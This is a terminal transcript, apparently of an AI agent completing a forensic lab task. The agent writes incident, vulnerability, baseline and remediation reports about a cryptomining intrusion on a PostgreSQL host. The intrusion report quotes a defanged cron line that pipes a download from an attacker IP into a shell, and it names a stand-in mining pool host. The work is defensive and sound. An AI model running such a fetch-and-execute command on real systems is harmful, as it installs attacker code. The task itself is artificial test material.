+Aug 23 03:42:55 postgres-prod-01 systemd[5858]: CPU0: Package temperature normal
+Aug 23 03:43:05 postgres-prod-01 systemd-logind[2970]: Time synchronised to time server
+Aug 23 03:43:42 postgres-prod-01 systemd[23224]: Received disconnect from 10.10.31.160 port 58646:11: disconnected by user
+Aug 23 03:43:54 postgres-prod-01 CRON[18660]: Received disconnect from 10.10.31.95 port 48887:11: disconnected by user
+Aug 23 03:44:21 postgres-prod-01 systemd-logind[15078]: CPU0: Package temperature normal
+Aug 23 03:45:04 postgres-prod-01 CRON[10641]: pam_unix(cron:session): session opened for user root
+Aug 23 03:45:34 postgres-prod-01 chronyd[12758]: Time synchronised to time server
+Aug 23 03:46:04 postgres-prod-01 dbus-daemon[19016]: Received disconnect from 10.10.31.163 port 44814:11: disconnected by user
+Aug 23 03:46:48 postgres-prod-01 dbus-daemon[8413]: Started Session 111 of user jenkins.
+Aug 23 03:47:27 postgres-prod-01 kernel[19398]: pam_unix(cron:session): session opened for user root
+Aug 23 03:48:15 postgres-prod-01 dbus-daemon[27604]: Started Session 485 of user devops.
+Aug 23 03:48:54 postgres-prod-01 sshd[27293]: pam_unix(cron:session): session opened for user root
+Aug 23 03:49:17 postgres-prod-01 dbus-daemon[20679]: Received disconnect from 10.10.31.57 port 44243:11: disconnected by user
+Aug 23 03:49:34 postgres-prod-01 systemd-logind[28013]: Started Session 357 of user jenkins.
+Aug 23 03:49:49 postgres-prod-01 systemd-logind[17620]: Received disconnect from 10.10.31.250 port 40604:11: disconnected by user
+Aug 23 03:50:17 postgres-prod-01 sshd[2073]: Time synchronised to time server
+Aug 23 03:50:58 postgres-prod-01 dbus-daemon[13067]: Received disconnect from 10.10.31.102 port 59932:11: disconnected by user
+Aug 23 03:51:11 postgres-prod-01 kernel[22783]: pam_unix(cron:session): session opened for user root
+Aug 23 03:51:18 postgres-prod-01 systemd[22446]: Received disconnect from 10.10.31.234 port 61272:11: disconnected by user
+Aug 23 03:51:23 postgres-prod-01 dbus-daemon[13339]: Time synchronised to time server
+Aug 23 03:51:41 postgres-prod-01 systemd-logind[10815]: CPU0: Package temperature normal
+Aug 23 03:52:27 postgres-prod-01 kernel[4291]: Started Session 542 of user svc-backup.
+Aug 23 03:52:49 postgres-prod-01 kernel[20258]: Received disconnect from 10.10.31.215 port 64823:11: disconnected by user
+Aug 23 03:53:04 postgres-prod-01 sudo[25761]: CPU0: Package temperature normal
+Aug 23 03:53:20 postgres-prod-01 dbus-daemon[6414]: CPU0: Package temperature normal
+Aug 23 03:53:54 postgres-prod-01 sudo[15021]: CPU0: Package temperature normal
+Aug 23 03:54:39 postgres-prod-01 chronyd[17703]: Started Session 674 of user jenkins.
+Aug 23 03:54:51 postgres-prod-01 systemd[1215]: Started Session 523 of user root.
+Aug 23 03:54:52 postgres-prod-01 systemd[28691]: Received disconnect from 10.10.31.216 port 60867:11: disconnected by user
+Aug 23 03:55:45 postgres-prod-01 systemd[3196]: pam_unix(cron:session): session opened for user root
+Aug 23 03:56:24 postgres-prod-01 systemd-logind[24474]: pam_unix(cron:session): session opened for user root
+Aug 23 03:56:28 postgres-prod-01 sshd[14251]: CPU0: Package temperature normal
+Aug 23 03:56:56 postgres-prod-01 sshd[25587]: pam_unix(cron:session): session opened for user root
+Aug 23 03:57:33 postgres-prod-01 CRON[5675]: Time synchronised to time server
+Aug 23 03:58:25 postgres-prod-01 sudo[26075]: pam_unix(cron:session): session opened for user root
+[?2004hroot@654d0bd251de:/app# sha256sum /disk/var/lib/pgsql/.local/pgdaemon
+[?2004lc7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603  /disk/var/lib/pgsql/.local/pgdaemon
+[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/progress.md
+[?2004l[?2004h> # DFIR Investigation Progress and Checklist
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Investigation Timeline
+[?2004l[?2004h> - **2026-08-23 03:20 UTC**: SOC incident ticket opened (`/sas/handoff/intake.pdf`). Initial alerts noted for dropper, cron persistence, and postgres baseline configuration weakness (`/sas/alerts.json`).
+[?2004l[?2004h> - **Phase 1: Initial Assessment & Triage**: Analyzed security alerts (`/sas/alerts.json`), baseline check (`/sas/baseline.json`), and vulnerability report (`/sas/vulns.json`). Reviewed CTI advisory (`/sas/cti/advisory.txt`).
+[?2004l[?2004h> - **Phase 2: Evidence Deep Dive on Forensic Image (`/disk`)**: Identified missing silent persistence and C2 channels omitted from automated alerting:
+[?2004l[?2004h>   - Database entry point: Unrestricted `trust` authentication configured in `/disk/var/lib/pgsql/data/pg_hba.conf`.
+[?2004l[?2004h>   - Execution & Dropper: Binary dropped at `/disk/var/lib/pgsql/.local/pgdaemon` (SHA256: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603`). M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K.
+[?2004l[?2004h>   - Cron Persistence: Malicious periodic re-dropper beacon located in `/disk/var/spool/cron/postgres`.
+[?2004l[?2004h>   - Systemd Persistence: Silent persistence systemd unit installed at `/disk/etc/systemd/system/pg-metrics.service`.
+[?2004l[?2004h>   - DNS Tunneling / C2: DNS exfiltration configuration discovered at `/disk/etc/pgdaemon.conf` and partial C2 beacon recovered from `/disk/var/lib/.cache/.wiped.bin`.
+[?2004l[?2004h>   - Anti-Forensics: Timestomping metadata record found at `/disk/var/lib/pgsql/.local/.timestamps`.
+[?2004l[?2004h> - **Phase 3: Change Ticket Reconciliation**: Corrected stale/incorrect entries in `/sas/handoff/change-ticket.md` using on-disk evidence.
+[?2004l[?2004h> - **Phase 4: Final Deliverables Generation**: Drafted comprehensive reports across all five required files under `/app`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Working Checklist
+[?2004l[?2004h> - [x] Review initial alerts and CTI threat intelligence advisory (`/sas/alerts.json`, `/sas/cti/advisory.txt`).
+[?2004l[?2004h> - [x] Investigate database entry vector (`/disk/var/lib/pgsql/data/pg_hba.conf`).
+[?2004l[?2004h> - [x] Inspect dropped binaries and calculate hashes (`/disk/var/lib/pgsql/.local/pgdaemon`).
+[?2004l[?2004h> - [x] Uncover scheduled task / cron persistence (`/disk/var/spool/cron/postgres`).
+[?2004l[?2004h> - [x] Discover silent systemd service persistence (`/disk/etc/systemd/system/pg-metrics.service`).
+[?2004l[?2004h> - [x] Verify legitimate vs malicious systemd services (`/disk/etc/systemd/system/pg-backup.service`).
+[?2004l[?2004h> - [x] Locate DNS tunneling C2 configuration and exfiltration artifacts (`/disk/etc/pgdaemon.conf`, `/disk/var/lib/.cache/.wiped.bin`).
+[?2004l[?2004h> - [x] Identify timestomping anti-forensics (`/disk/var/lib/pgsql/.local/.timestamps`).
+[?2004l[?2004h> - [x] Reconcile handoff change ticket CHG-6386 (`/sas/handoff/change-ticket.md`).
+[?2004l[?2004h> - [x] Generate all 5 required deliverable reports in `/app`.
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/intrusion-report.md
+[?2004l[?2004h> # Post-Compromise Intrusion Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Executive Summary
+[?2004l603` (`/di[?2004h> On host `postgres-prod-01`, an external attacker exploited weak database authentication configuration to gain initial access, execute system commands via PostgreSQL, exfiltrate data via DNS tunneling, establish redundant persistence mechanisms (cron and systemd), and perform timestomping anti-forensic techniques. Endpoint detection and security product telemetry (`/sas/alerts.json`) captured only a subset of the intrusion chain. Forensic analysis of `/disk` revealed additional silent persistence and C2 infrastructure.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Attack Chain & ATT&CK Mapping
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1: Valid Accounts / Weak Authentication (T1078)
+[?2004l[?2004h> - **Description**: PostgreSQL server was exposed with weak superuser authentication and permissive `trust` authentication rules for all external IP addresses. M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K.
+[?2004l[?2004h> - **Alerted Status**: Alerted via baseline check (`/sas/alerts.json:17`, `/sas/baseline.json:3`).
+[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/data/pg_hba.conf:3` (`trust` auth configured for `0.0.0.0/0`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2: Unix Shell Command Execution via COPY PROGRAM (T1059.004)
+[?2004l[?2004h> - **Description**: Attacker leveraged PostgreSQL's `COPY ... TO PROGRAM` feature to execute arbitrary shell commands under the `postgres` system account, dropping a malicious executable payload.
+[?2004l[?2004h> - **Alerted Status**: Dropper payload alerted (`/sas/alerts.json:3`).
+[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/.local/pgdaemon` (Dropper sample, SHA256: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 3: DNS-Tunnel Exfiltration & C2 (T1048.003)
+[?2004l[?2004h> - **Description**: Attacker configured DNS-tunneling for command-and-control and data exfiltration. Domain queries were routed through `update-postgres.example.cn`.
+[?2004l[?2004h> - **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).
+[?2004l[?2004h> - **Evidence**: `/disk/etc/pgdaemon.conf:3` (DNS tunneling resolver config) and `/disk/var/lib/.cache/.wiped.bin:1` (recovered C2 beacon data indicating C2 traffic to IP `198.51.100.214` and resolver `update-postgres.example.cn`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 4: Cron Persistence (T1053.003)
+[?2004l[?2004h> - **Description**: Attacker installed a cron job under user `postgres` executing periodic `curl` commands to re-download dropper payloads from `198.51.100.214`.
+[?2004l[?2004h> - **Alerted Status**: Alerted (`/sas/alerts.json:10`).
+[?2004l[?2004h> - **Evidence**: `/disk/var/spool/cron/postgres:5` (`# * * * * * root <defanged beacon: curl hxxp://198.51.100.214/x | sh>`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 5: Systemd Service Persistence (T1543.002)
+[?2004l[?2004h> - **Description**: Attacker installed a silent systemd service `pg-metrics.service` configured to execute the `pgdaemon` re-dropper on boot/startup.
+[?2004l[?2004h> - **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).
+[?2004l[?2004h> - **Evidence**: `/disk/etc/systemd/system/pg-metrics.service:5` (`ExecStart launches an xmrig / pgdaemon re-dropper`). Note: `/disk/etc/systemd/system/pg-backup.service:3` was inspected and verified as a legitimate, benign scheduled backup job.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 6: Timestomp Anti-Forensics (T1070.006)
+[?2004l[?2004h> - **Description**: Attacker modified timestamp metadata on dropped binaries to match system binaries (`/bin/ls`) to impede forensic timeline analysis.
+[?2004l[?2004h> - **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).
+[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/.local/.timestamps:2` (`timestomp anti-forensics: mtime backdated to match /bin/ls`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Key Entities & Indicators of Compromise (IoCs)
+[?2004l[?2004h> - **Attacker Source IP**: `198.51.100.214` (`/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/postgres:5`, `/disk/var/lib/.cache/.wiped.bin:1`)
+[?2004l[?2004h> - **C2 / Resolver Domain**: `update-postgres.example.cn` (`/sas/cti/advisory.txt:17`, `/disk/etc/pgdaemon.conf:3`, `/disk/var/lib/.cache/.wiped.bin:1`)
+[?2004l[?2004h> - **Mining Pool URI**: `stratum+tcp://xmr.postgres.evil:3333` (`/sas/cti/advisory.txt:18`, `/disk/var/lib/pgsql/.local/pgdaemon:6`)
+[?2004l[?2004h> - **Wallet Address**: `4A000000000000000000c5f08041507f` (`/sas/cti/advisory.txt:19`, `/disk/var/lib/pgsql/.local/pgdaemon:7`)
+[?2004l[?2004h> - **Dropper File Path**: `/var/lib/pgsql/.local/pgdaemon` (`/disk/var/lib/pgsql/.local/pgdaemon`, `/sas/alerts.json:5`)
+[?2004l[?2004h> - **Dropper File SHA256**: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603` (`/disk/var/lib/pgsql/.local/pgdaemon`)
+[?2004l[?2004h> - **C2 Config File Path**: `/etc/pgdaemon.conf` (`/disk/etc/pgdaemon.conf`)
+[?2004l[?2004h> - **Cron Task Path**: `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres`)
+[?2004l[?2004h> - **Systemd Unit Path**: `/etc/systemd/system/pg-metrics.service` (`/disk/etc/systemd/system/pg-metrics.service`)
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Impact & Findings Summary
+[?2004l[?2004h> - Automated alerting in `/sas/alerts.json` captured 3 items (`CHK-01`, `CHK-02`, `CHK-06`).
+[?2004l[?2004h> - Forensic inspection revealed 3 additional critical silent actions (`T1048.003` DNS tunneling C2, `T1543.002` systemd persistence, and `T1070.006` timestomping).
+[?2004l[?2004h> - Confirmed data exfiltration capability via DNS tunnel (`/disk/etc/pgdaemon.conf:3`).
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/vuln-report.md
+[?2004l[?2004h> # Vulnerability Analysis Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Vulnerability Scan Results
+[?2004l[?2004h> - **Automated Vulnerability Scan**: The vulnerability scan report (`/sas/vulns.json:1`) returned zero identified CVE vulnerabilities (`[]`).
+[?2004l[?2004h> - **Software / OS Vulnerabilities**: Forensic inspection of system package summaries (`/disk/var/lib/dpkg/status.summary:1`) and service configurations confirms that no unpatched operating system or binary memory-corruption CVE was exploited for initial compromise.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Entry Vector Analysis
+[?2004l[?2004h> - **Primary Compromise Vector**: The compromise was not driven by a traditional software vulnerability (CVE). Instead, initial access was gained through legitimate authentication functionality combined with extreme configuration exposure:
+[?2004l[?2004h>   1. Permissive PostgreSQL `trust` authentication enabled in `/disk/var/lib/pgsql/data/pg_hba.conf:3` allowed network connections without password authentication.
+[?2004l[?2004h>   2. Superuser privileges permitted the execution of arbitrary operating system commands using PostgreSQL's built-in `COPY ... TO PROGRAM` SQL feature (ATT&CK technique `T1059.004` cited in `/sas/cti/advisory.txt:13`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Analysis of Misattributed CVEs (BlueKeep / CVE-2019-0708)
+[?2004l[?2004h> - **Stale/Incorrect Change Ticket Claim**: Draft ticket `CHG-6386` (`/sas/handoff/change-ticket.md:8`) recommended patching `CVE-2019-0708` (BlueKeep).
+[?2004l[?2004h> - **Assessment**: `CVE-2019-0708` (BlueKeep) is an Remote Desktop Protocol (RDP) Remote Code Execution vulnerability specific to Microsoft Windows operating systems. The target host `postgres-prod-01` is running CentOS Stream 9 / Linux (`/disk/etc/os-release`, `/sas/cti/advisory.txt:5`). BlueKeep is completely irrelevant to this host and was erroneously included by a prior shift relying solely on generic ticket templates without evidence.
+[?2004l[?2004h> - **Confidence Level**: HIGH (`/sas/cti/advisory.txt:3`, `/sas/vulns.json:1`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Conclusion
+[?2004l[?2004h> - No software CVE patch is required for initial entry remediation. Technical remediation must focus on hardening PostgreSQL authentication configuration (`pg_hba.conf`) and restricting database superuser program execution privileges.
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/baseline-report.md
+[?2004l[?2004h> # Baseline Configuration Assessment Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Overview
+[?2004l[?2004h> This report details configuration weaknesses, policy compliance failures, and baseline security deviations identified on host `postgres-prod-01` during forensic investigation.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Identified Baseline Failures
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 1. PostgreSQL Permissive Host Authentication (`pg_hba.conf`)
+[?2004l[?2004h> - **Check Reference**: `CHK-06` / `BAS-01` (`/sas/baseline.json:3`, `/sas/alerts.json:17`).
+[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/data/pg_hba.conf:3` (`pg_hba.conf grants 'trust' auth for 0.0.0.0/0`).
+[?2004l[?2004h> - **Risk Impact**: Configuring `trust` authentication for network wildcard address `0.0.0.0/0` allows any TCP/IP client to connect as any PostgreSQL user (including superuser `postgres`) without providing a password. This completely bypasses authentication controls.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 2. Superuser Password & Privilege Controls
+[?2004l[?2004h> - **Reference**: CTI Advisory Step 1 (`/sas/cti/advisory.txt:12`, `T1078`).
+[?2004l[?2004h> - **Evidence**: `/disk/var/lib/pgsql/data/pg_hba.conf:3` and PostgreSQL database default privileges.
+[?2004l[?2004h> - **Risk Impact**: Weak database superuser controls combined with `trust` auth allowed remote attackers to execute `COPY ... TO PROGRAM` statements without authorization, granting direct system command execution as user `postgres`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 3. Unrestricted Egress & DNS Traffic Controls
+[?2004l[?2004h> - **Evidence**: `/disk/etc/pgdaemon.conf:3` (DNS tunnel configuration targeting resolver `update-postgres.example.cn`).
+[?2004l[?2004h> - **Risk Impact**: Absence of outbound egress filtering and internal DNS query monitoring allowed covert C2 communication and data exfiltration over arbitrary DNS queries.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 4. Cron & Systemd Service Modification Monitoring Gaps
+[?2004l[?2004h> - **Evidence**: `/disk/var/spool/cron/postgres:5` and `/disk/etc/systemd/system/pg-metrics.service:5`.
+[?2004l[?2004h> - **Risk Impact**: Lack of file integrity monitoring (FIM) or auditing on systemd unit directories (`/etc/systemd/system/`) and spool directories (`/var/spool/cron/`) allowed silent persistence to remain undetected by automated security product feeds.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Recommended Baseline Configuration Standard
+[?2004l[?2004h> 1. Modify `/var/lib/pgsql/data/pg_hba.conf` to replace `trust` with `scram-sha-256` or `md5` authentication, and restrict client address ranges to specific trusted subnets.
+[?2004l[?2004h> 2. Enforce strong password requirements for database superuser accounts.
+[?2004l[?2004h> 3. Implement file integrity monitoring (FIM) on system cron directories and systemd unit paths.
+[?2004l[?2004h> 4. Restrict outbound DNS traffic to designated internal recursive resolvers.
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@654d0bd251de:/app# cat <<'EOF' > /app/remediation-plan.md
+[?2004l[?2004h> # Remediation and Response Plan
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Overview
+[?2004l[?2004h> This plan outlines prioritized, step-by-step technical remediation instructions for host `postgres-prod-01`. All recommendations adhere to the containment principle of preferring backup and quarantine over destructive deletion. Every action directly addresses findings verified on `/disk` and reconciles change ticket `CHG-6386` (`/sas/handoff/change-ticket.md`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Reconciled Change Ticket: CHG-6386
+[?2004l[?2004h> Below is the reconciled change ticket table reflecting verified findings from `/disk` and `/sas`:
+[?2004l[?2004h> 
+[?2004l[?2004h> | # | Action | Target | Status | Note / Evidence Citation |
+[?2004l[?2004h> |---|--------|--------|--------|--------------------------|
+[?2004l[?2004h> | 1 | Block malicious source IP inbound & outbound | `198.51.100.214` | Proposed | Corrected IP from stale `203.0.113.9` to `198.51.100.214` (`/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/postgres:5`, `/disk/var/lib/.cache/.wiped.bin:1`). |
+[?2004l[?2004h> | 2 | Harden PostgreSQL auth & revoke program execution | `/var/lib/pgsql/data/pg_hba.conf` | Proposed | Replaced irrelevant BlueKeep CVE-2019-0708 with database authentication hardening. Remove `trust` auth for `0.0.0.0/0` (`/disk/var/lib/pgsql/data/pg_hba.conf:3`). |
+[?2004l[?2004h> | 3 | Remove & quarantine malicious cron job | `/var/spool/cron/postgres` | Proposed | Corrected path from `/var/spool/cron/root` to `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres:5`). Downgraded status from DONE to Proposed (unverified entry was still active on disk). |
+[?2004l[?2004h> | 4 | Quarantine dropped malware binary | `/var/lib/pgsql/.local/pgdaemon` | Proposed | Silent artifact added. Quarantine dropper binary (`/disk/var/lib/pgsql/.local/pgdaemon`, SHA256: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603`). |
+[?2004l[?2004h> | 5 | Disable & quarantine malicious systemd service | `/etc/systemd/system/pg-metrics.service` | Proposed | Silent artifact added. Disable and quarantine malicious systemd service (`/disk/etc/systemd/system/pg-metrics.service:5`). Maintain benign `/etc/systemd/system/pg-backup.service` (`/disk/etc/systemd/system/pg-backup.service:3`). |
+[?2004l[?2004h> | 6 | Remove & quarantine DNS tunnel configuration | `/etc/pgdaemon.conf` | Proposed | Silent artifact added. Quarantine DNS tunnel C2 configuration (`/disk/etc/pgdaemon.conf:3`). |
+[?2004l[?2004h> | 7 | Quarantine timestomping forensic artifacts | `/var/lib/pgsql/.local/.timestamps` | Proposed | Silent artifact added. Preserve and quarantine timestomping log file (`/disk/var/lib/pgsql/.local/.timestamps:2`). |
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Prioritized Execution Steps
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Phase 1: Containment & Isolation (Immediate)
+[?2004l[?2004h> 1. **Network Layer Containment**
+[?2004l[?2004h>    - Action: Block inbound and outbound traffic to attacker IP `198.51.100.214` (`/sas/cti/advisory.txt:6`).
+[?2004l[?2004h>    - Command: `iptables -A INPUT -s 198.51.100.214 -j DROP && iptables -A OUTPUT -d 198.51.100.214 -j DROP`
+[?2004l[?2004h>    - Verification: `iptables -L -n -v | grep 198.51.100.214`
+[?2004l[?2004h> 
+[?2004l[?2004h> 2. **Block C2 DNS Resolver**
+[?2004l[?2004h>    - Action: Sinkhole / drop DNS queries targeting `update-postgres.example.cn` (`/disk/etc/pgdaemon.conf:3`, `/disk/var/lib/.cache/.wiped.bin:1`).
+[?2004l[?2004h>    - Command: Add `0.0.0.0 update-postgres.example.cn` to `/etc/hosts`.
+[?2004l[?2004h>    - Verification: `ping -c 1 update-postgres.example.cn` resolves to `0.0.0.0`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Phase 2: Persistence Removal & Quarantine (High Priority)
+[?2004l[?2004h> 1. **Quarantine Dropper Binary & C2 Config**
+[?2004l[?2004h>    - Action: Create secure directory `/var/quarantine/` (mode 700) and move malware files (`/disk/var/lib/pgsql/.local/pgdaemon:1`, `/disk/etc/pgdaemon.conf:3`).
+[?2004l[?2004h>    - Command:
+[?2004l[?2004h>      ```bash
+[?2004l[?2004h>      mkdir -p /var/quarantine
+[?2004l[?2004h>      chmod 700 /var/quarantine
+[?2004l[?2004h>      cp -a /var/lib/pgsql/.local/pgdaemon /var/quarantine/pgdaemon.bak
+[?2004l[?2004h>      cp -a /etc/pgdaemon.conf /var/quarantine/pgdaemon.conf.bak
+[?2004l[?2004h>      rm -f /var/lib/pgsql/.local/pgdaemon /etc/pgdaemon.conf
+[?2004l[?2004h>      ```
+[?2004l[?2004h>    - Verification: `ls -la /var/lib/pgsql/.local/pgdaemon /etc/pgdaemon.conf` (confirm files no longer exist in original paths).
+[?2004l[?2004h> 
+[?2004l[?2004h> 2. **Disable Malicious Systemd Persistence Service**
+[?2004l[?2004h>    - Action: Stop, disable, and quarantine `/etc/systemd/system/pg-metrics.service` (`/disk/etc/systemd/system/pg-metrics.service:5`). Do NOT touch `/etc/systemd/system/pg-backup.service` (`/disk/etc/systemd/system/pg-backup.service:3`).
+[?2004l[?2004h>    - Command:
+[?2004l[?2004h>      ```bash
+[?2004l[?2004h>      systemctl stop pg-metrics.service
+[?2004l[?2004h>      systemctl disable pg-metrics.service
+[?2004l[?2004h>      mv /etc/systemd/system/pg-metrics.service /var/quarantine/
+[?2004l[?2004h>      systemctl daemon-reload
+[?2004l[?2004h>      ```
+[?2004l[?2004h>    - Verification: `systemctl status pg-metrics.service` returns `Unit pg-metrics.service could not be found.`
+[?2004l[?2004h> 
+[?2004l[?2004h> 3. **Remediate Cron Persistence**
+[?2004l[?2004h>    - Action: Backup and clean `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres:5`).
+[?2004l[?2004h>    - Command:
+[?2004l[?2004h>      ```bash
+[?2004l[?2004h>      cp -a /var/spool/cron/postgres /var/quarantine/cron-postgres.bak
+[?2004l[?2004h>      sed -i '/198\.51\.100\.214/d' /var/spool/cron/postgres
+[?2004l[?2004h>      ```
+[?2004l[?2004h>    - Verification: `crontab -l -u postgres | grep 198.51.100.214` returns no matches.
+[?2004l[?2004h> 
+[?2004l[?2004h> 4. **Quarantine Timestomping Artifacts**
+[?2004l[?2004h>    - Action: Move `/var/lib/pgsql/.local/.timestamps` (`/disk/var/lib/pgsql/.local/.timestamps:2`) to `/var/quarantine/`.
+[?2004l[?2004h>    - Command: `mv /var/lib/pgsql/.local/.timestamps /var/quarantine/.timestamps.bak`
+[?2004l[?2004h>    - Verification: Check `/var/lib/pgsql/.local/` to ensure hidden metadata file is removed.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Phase 3: Vulnerability Eradication & Hardening (Medium Priority)
+[?2004l[?2004h> 1. **PostgreSQL Authentication Hardening**
+[?2004l[?2004h>    - Action: Update `/var/lib/pgsql/data/pg_hba.conf` (`/disk/var/lib/pgsql/data/pg_hba.conf:3`) to remove `trust` authentication and enforce password authentication (`scram-sha-256`) restricted to localhost or internal subnet.
+[?2004l[?2004h>    - Command: Modify `/var/lib/pgsql/data/pg_hba.conf` and reload PostgreSQL (`systemctl reload postgresql`).
+[?2004l[?2004h>    - Verification: Attempt connection without password from external host (connection refused/rejected).
+[?2004l[?2004h> 
+[?2004l[?2004h> 2. **PostgreSQL Privilege Control**
+[?2004l[?2004h>    - Action: Revoke execution privileges on `COPY PROGRAM` from non-essential roles and set strong superuser password.
+[?2004l[?2004h>    - Verification: `SELECT * FROM pg_user;` and audit superuser permissions.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Phase 4: Recovery & Monitoring (Ongoing)
+[?2004l[?2004h> 1. Deploy File Integrity Monitoring (FIM / `auditd`) on `/etc/systemd/system/` and `/var/spool/cron/`.
+[?2004l[?2004h> 2. Enable PostgreSQL connection logging and query auditing.
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@654d0bd251de:/app# ls -la /app
+[?2004ltotal 36
+drwxr-xr-x 1 root root 4096 Aug 16 17:48 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:45 [01;34m..[0m
+-rw-r--r-- 1 root root 2480 Aug 16 17:48 baseline-report.md
+-rw-r--r-- 1 root root 4832 Aug 16 17:47 intrusion-report.md
+-rw-r--r-- 1 root root 2628 Aug 16 17:47 progress.md
+-rw-r--r-- 1 root root 6220 Aug 16 17:48 remediation-plan.md
+-rw-r--r-- 1 root root 2102 Aug 16 17:47 vuln-report.md
+[?2004hroot@654d0bd251de:/app# 
